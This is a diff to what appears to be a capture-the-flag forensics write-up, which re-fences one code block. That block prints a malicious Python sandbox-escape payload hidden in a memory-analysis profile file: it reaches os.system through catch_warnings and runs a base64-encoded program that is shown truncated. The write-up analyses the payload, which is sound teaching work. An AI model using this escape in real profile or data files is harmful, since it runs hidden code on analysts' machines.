@@ -34,8 +34,8 @@ analyst@forensic_server:~$
 
 The other person executed a python2 script, we can download [good_profile.zip](good_profile.zip) to view what happened, unzipping it and looking at [dwarf.txt.conv.vtypes](dwarf.txt.conv.vtypes) we see:
 
-```
-'custom_element': [0x2, [[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo "hello fellow analyst ! just checking a few things do not mind :)" && python2 -c \'import base64; exec(base64.b64decode("IyEvdXN...Q5NSkpCg=="))\'')]],
+```python
+'custom_element': [0x2, [[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo "hello fellow analyst ! just checking a few things do not mind :)" && python2 -c \\'import base64; exec(base64.b64decode("IyEvdXN...Q5NSkpCg=="))\\'')]],
 ```
 
 We can decode this huge base64 into another python2 program:
